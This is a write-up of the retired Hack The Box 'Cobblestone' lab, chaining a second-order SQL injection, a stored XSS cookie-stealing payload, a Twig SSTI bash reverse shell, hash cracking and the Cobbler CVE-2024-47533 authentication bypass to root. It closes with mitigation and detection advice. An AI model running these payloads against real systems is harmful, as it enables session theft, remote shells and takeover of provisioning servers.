---
machine: Cobblestone
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, sqli, second-order, xss, twig, ssti, cobbler, cve-2024-47533]
---

# Cobblestone — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

Debian 12 behind two vhosts. A **second-order SQLi** in the voting app allows `LOAD_FILE` and reads Apache's vhost config, which reveals an internal proxy to **Cobbler** on `127.0.0.1:25151`. A **stored XSS** hands over the admin session, the deploy panel renders **Twig** with a user-supplied field (**SSTI**) for a shell, the database bcrypt hash opens SSH as `cobble`, and **CVE-2024-47533** finishes as root through Cobbler's authentication bypass.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
# 22, 80 and 443
ffuf -u http://<IP> -H "Host: FUZZ.cobblestone.htb" -w subdomains.txt -mc 200,403
```

```text
vote.cobblestone.htb     (voting app)
deploy.cobblestone.htb   (deploy panel)
```

## Enumeration

`vote` is a voting site with comments; `deploy` is a team page behind a login. Without credentials the only entry point is voting: the comment is stored and later reused in the administrator's moderation query (second-order SQLi).

## Foothold

### 1. Second-order SQLi and file read

The comment `x', (SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'))) -- -` is stored clean and fires when the admin opens moderation, which embeds it in the query. `LOAD_FILE` returns the `<VirtualHost>` with the document roots and, above all:

```text
ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
```

A **Cobbler** provisioning server listening on localhost only.

### 2. Stored XSS and the admin session

The sanitiser is bypassed with an SVG in another field:

```html
<svg/onload=fetch('http://<IP>:8000/'+document.cookie)>
```

Some writeups use a variant where the admin loads a page with `phpinfo()` and the cookie is printed in the response, with no external server. With the admin's `PHPSESSID` the `deploy` panel opens.

### 3. Twig SSTI

The panel renders a user-editable field (the first name in user management) as a Twig template:

```text
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'")}}
```

```bash
nc -lvnp 4444
# www-deploy@cobblestone:~$
```

## Lateral movement

The application database stores bcrypt hashes; `cobble`'s falls to a dictionary and is reused over SSH:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
ssh cobble@cobblestone.htb
```

## Escalation

Cobbler is not reachable from outside, but it is from the SSH session:

```bash
ssh -N -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
curl -s -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?><methodCall><methodName>version</methodName><params/></methodCall>' \
  http://127.0.0.1:25151/cobbler_api
# 3.3.6
```

**CVE-2024-47533** (Cobbler >= 3.0.0, < 3.2.3 and >= 3.3.0, < 3.3.7): `utils.get_shared_secret()` always returns `-1`, so logging in with an empty username and password `-1` succeeds. With the admin token, create a distro/profile and run a command as root:

```python
import xmlrpc.client
srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/cobbler_api", allow_none=True)
tok = srv.login("", -1)
# create a distro/profile and trigger the action that executes the command
```

## Evidence (redacted)

```text
/home/cobble/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lessons

- **Second-order SQLi**: the payload is stored clean and fires when read back; WAFs that only inspect the inbound request miss it.
- `LOAD_FILE` remains available when the DB user holds `FILE`: Apache's configuration is a map of the internal network.
- **SSTI** in a field that looks cosmetic (a user's first name) is RCE.
- **CVE-2024-47533 is an authentication bypass**, not command injection: log in with `""`/`-1` and drive Cobbler's legitimate APIs.
- Mitigation: prepared statements on every read, `FILE` revoked, Twig without `registerUndefinedFilterCallback`, Cobbler patched and `cobblerd` behind real authentication.

## Detection and mitigation

- Parameterised queries on every read, moderation included.
- Revoke `FILE` from the database user and stop exposing Apache's configuration through it.
- Twig sandbox plus an allowlist of editable fields; never render user text as a template.
- Cobbler >= 3.2.3 / 3.3.7 and no API published through a proxy.
- Detection: comments with `LOAD_FILE`/`UNION`, admin sessions used from another IP, `/cobbler_api` requests and logins with an empty username.

## References

- [CVE-2024-47533](https://nvd.nist.gov/vuln/detail/CVE-2024-47533)
- [ssti](../../../knowledge/web/ssti.md)
